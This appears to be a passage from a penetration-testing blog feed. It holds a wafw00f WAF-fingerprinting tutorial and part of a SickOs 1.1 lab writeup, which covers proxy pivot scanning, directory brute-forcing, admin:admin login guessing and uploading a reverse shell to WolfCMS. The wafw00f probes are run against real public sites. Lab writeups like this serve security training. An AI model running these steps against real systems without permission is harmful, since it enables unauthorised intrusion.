<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>/ You have literary talent that you \
</span><span class='line'>\ should take pains to develop.     /
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools/"/>
    <updated>2017-06-30T04:46:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you need to establish if a web application firewall is in place, and ideally, what type of WAF it is. You can go bark at it with wafw00f!</p>

<p>Homepage: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>

<!-- more -->


<h2>wafw00f description</h2>

<blockquote><p>WAFW00F identifies and fingerprints Web Application Firewall (WAF) products.</p>

<p>How does it work?</p>

<p>To do its magic, WAFW00F does the following:</p>

<p> Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions</p>

<p> If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to
deduce which WAF it is</p>

<p> If that is also not successful, it analyses the responses previously returned and uses another simple algorithm
to guess if a WAF or security solution is actively responding to our attacks</p></blockquote>

<h2>wafw00f options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -h
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Usage: wafw00f url1 [url2 [url3 ... ]]
</span><span class='line'>example: wafw00f http://www.victim.org/
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -v, --verbose         enable verbosity - multiple -v options increase
</span><span class='line'>                        verbosity
</span><span class='line'>  -a, --findall         Find all WAFs, do not stop testing on the first one
</span><span class='line'>  -r, --disableredirect
</span><span class='line'>                        Do not follow redirections given by 3xx responses
</span><span class='line'>  -t TEST, --test=TEST  Test for one specific WAF
</span><span class='line'>  -l, --list            List all WAFs that we are able to detect
</span><span class='line'>  --xmlrpc              Switch on the XML-RPC interface instead of CUI
</span><span class='line'>  --xmlrpcport=XMLRPCPORT
</span><span class='line'>                        Specify an alternative port to listen on, default 8001
</span><span class='line'>  -V, --version         Print out the version</span></code></pre></td></tr></table></div></figure>


<h2>wafw00f usage</h2>

<ul>
<li>see what WAFs it can detect at the moment</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -l
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Can test for these WAFs:
</span><span class='line'>
</span><span class='line'>Profense
</span><span class='line'>NetContinuum
</span><span class='line'>Incapsula WAF
</span><span class='line'>CloudFlare
</span><span class='line'>USP Secure Entry Server
</span><span class='line'>Cisco ACE XML Gateway
</span><span class='line'>Barracuda Application Firewall
</span><span class='line'>Art of Defence HyperGuard
</span><span class='line'>BinarySec
</span><span class='line'>Teros WAF
</span><span class='line'>F5 BIG-IP LTM
</span><span class='line'>F5 BIG-IP APM
</span><span class='line'>F5 BIG-IP ASM
</span><span class='line'>F5 FirePass
</span><span class='line'>F5 Trafficshield
</span><span class='line'>InfoGuard Airlock
</span><span class='line'>Citrix NetScaler
</span><span class='line'>Trustwave ModSecurity
</span><span class='line'>IBM Web Application Security
</span><span class='line'>IBM DataPower
</span><span class='line'>DenyALL WAF
</span><span class='line'>Applicure dotDefender
</span><span class='line'>Juniper WebApp Secure
</span><span class='line'>Microsoft URLScan
</span><span class='line'>Aqtronix WebKnight
</span><span class='line'>eEye Digital Security SecureIIS
</span><span class='line'>Imperva SecureSphere
</span><span class='line'>Microsoft ISA Server</span></code></pre></td></tr></table></div></figure>


<ul>
<li>detect WAF</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f https://bugcrowd.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking https://bugcrowd.com
</span><span class='line'>The site https://bugcrowd.com is behind a CloudFlare
</span><span class='line'>Number of requests: 1</span></code></pre></td></tr></table></div></figure>


<ul>
<li>not detecting WAF</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f cisco.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking http://cisco.com
</span><span class='line'>Generic Detection results:
</span><span class='line'>No WAF detected by the generic detection
</span><span class='line'>Number of requests: 13</span></code></pre></td></tr></table></div></figure>


<ul>
<li>establish there is a WAF but without detecting its type</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -a microsoft.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking http://microsoft.com
</span><span class='line'>Generic Detection results:
</span><span class='line'>The site http://microsoft.com seems to be behind a WAF or some sort of security solution
</span><span class='line'>Reason: The server returned a different response code when a string trigged the blacklist.
</span><span class='line'>Normal response code is "400", while the response code to an attack is "301"
</span><span class='line'>Number of requests: 13</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ You'll wish that you had done some of \
</span><span class='line'>| the hard things when they were easier |
</span><span class='line'>\ to do.                                /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
    <updated>2017-06-28T08:09:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results are:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p- -A 192.168.217.143
</span><span class='line'>
</span><span class='line'>PORT     STATE  SERVICE    VERSION
</span><span class='line'>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
</span><span class='line'>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
</span><span class='line'>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
</span><span class='line'>3128/tcp open   http-proxy Squid http proxy 3.1.19
</span><span class='line'>| http-open-proxy: Potentially OPEN proxy.
</span><span class='line'>|_Methods supported: GET HEAD
</span><span class='line'>|_http-server-header: squid/3.1.19
</span><span class='line'>|_http-title: ERROR: The requested URL could not be retrieved
</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure>


<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>

<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
which allows the attack to pivot to another part of the network).</p></blockquote>

<p>Here are the options I&rsquo;ve used for the scanner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/http/squid_pivot_scanning):
</span><span class='line'>
</span><span class='line'>   Name          Current Setting                                  Required  Description
</span><span class='line'>   ----          ---------------                                  --------  -----------
</span><span class='line'>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
</span><span class='line'>   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
</span><span class='line'>   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
</span><span class='line'>   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
</span><span class='line'>   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT         3128                                             yes       The target port (TCP)
</span><span class='line'>   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   THREADS       1                                                yes       The number of concurrent threads
</span><span class='line'>   VHOST                                                          no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; run
</span><span class='line'>
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-web.png" title="web server" alt="webpage"></p>

<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>

<h3>dirb description</h3>

<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>

<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
Objects. It basically works by launching a dictionary based attack against
a web server and analizing the response.</p>

<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
you can use your custom wordlists. Also DIRB sometimes can be used as a
classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>

<p>DIRB main purpose is to help in professional web application auditing.
Specially in security related testing. It covers some holes not covered by
classic web vulnerability scanners. DIRB looks for specific web objects that
other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
nor does it look for web contents that can be vulnerables.</p></blockquote>

<h3>dirb options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>./dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]
</span><span class='line'>
</span><span class='line'>========================= NOTES =========================
</span><span class='line'> &lt;url_base&gt; : Base URL to scan. (Use -resume for session resuming)
</span><span class='line'> &lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)
</span><span class='line'>
</span><span class='line'>======================== HOTKEYS ========================
</span><span class='line'> 'n' -&gt; Go to next directory.
</span><span class='line'> 'q' -&gt; Stop scan. (Saving state for resume)
</span><span class='line'> 'r' -&gt; Remaining scan stats.
</span><span class='line'>
</span><span class='line'>======================== OPTIONS ========================
</span><span class='line'> -a &lt;agent_string&gt; : Specify your custom USER_AGENT.
</span><span class='line'> -c &lt;cookie_string&gt; : Set a cookie for the HTTP request.
</span><span class='line'> -f : Fine tunning of NOT_FOUND (404) detection.
</span><span class='line'> -H &lt;header_string&gt; : Add a custom header to the HTTP request.
</span><span class='line'> -i : Use case-insensitive search.
</span><span class='line'> -l : Print "Location" header when found.
</span><span class='line'> -N &lt;nf_code&gt;: Ignore responses with this HTTP code.
</span><span class='line'> -o &lt;output_file&gt; : Save output to disk.
</span><span class='line'> -p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080)
</span><span class='line'> -P &lt;proxy_username:proxy_password&gt; : Proxy Authentication.
</span><span class='line'> -r : Don't search recursively.
</span><span class='line'> -R : Interactive recursion. (Asks for each directory)
</span><span class='line'> -S : Silent Mode. Don't show tested words. (For dumb terminals)
</span><span class='line'> -t : Don't force an ending '/' on URLs.
</span><span class='line'> -u &lt;username:password&gt; : HTTP Authentication.
</span><span class='line'> -v : Show also NOT_FOUND pages.
</span><span class='line'> -w : Don't stop on WARNING messages.
</span><span class='line'> -X &lt;extensions&gt; / -x &lt;exts_file&gt; : Append each word with this extensions.
</span><span class='line'> -z &lt;milisecs&gt; : Add a miliseconds delay to not cause excessive Flood.
</span><span class='line'>
</span><span class='line'>======================== EXAMPLES =======================
</span><span class='line'> ./dirb http://url/directory/ (Simple Test)
</span><span class='line'> ./dirb http://url/ -X .html (Test files with '.html' extension)
</span><span class='line'> ./dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
</span><span class='line'> ./dirb https://secure_url/ (Simple Test with SSL)</span></code></pre></td></tr></table></div></figure>


<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.217.143 /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Thu Jun 29 06:45:12 2017
</span><span class='line'>URL_BASE: http://192.168.217.143/
</span><span class='line'>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
</span><span class='line'>PROXY: 192.168.217.143:3128
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: 4612                                                          
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.217.143/ ----
</span><span class='line'>+ http://192.168.217.143/cgi-bin/ (CODE:403|SIZE:291)                                                                                               
</span><span class='line'>+ http://192.168.217.143/connect (CODE:200|SIZE:109)                                                                                                
</span><span class='line'>+ http://192.168.217.143/index (CODE:200|SIZE:21)                                                                                                   
</span><span class='line'>+ http://192.168.217.143/index.php (CODE:200|SIZE:21)                                                                                               
</span><span class='line'>+ http://192.168.217.143/robots (CODE:200|SIZE:45)                                                                                                  
</span><span class='line'>+ http://192.168.217.143/robots.txt (CODE:200|SIZE:45)                                                                                              
</span><span class='line'>+ http://192.168.217.143/server-status (CODE:403|SIZE:296)                                                                                          
</span><span class='line'>                                                                                                                                                    
</span><span class='line'>-----------------
</span><span class='line'>END_TIME: Thu Jun 29 06:45:16 2017
</span><span class='line'>DOWNLOADED: 4612 - FOUND: 7</span></code></pre></td></tr></table></div></figure>


<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
</span><span class='line'>
</span><span class='line'>print "I Try to connect things very frequently\n"
</span><span class='line'>print "You may want to try my services"</span></code></pre></td></tr></table></div></figure>


<p>The robots.txt file seems the most useful:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /
</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure>


<p>A hidden CMS, eh? I went there to find this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-wolfcms.png" title="wolfcms" alt="wolfcms"></p>

<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-login.png" title="wolfcms admin" alt="wolfcms admin login"></p>

<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-admin.png" title="admin" alt="wolfcms admin panel"></p>

<h2>Exploitation</h2>

<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS&#8217; File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-file.png" title="file manager" alt="wolfcms file upload"></p>

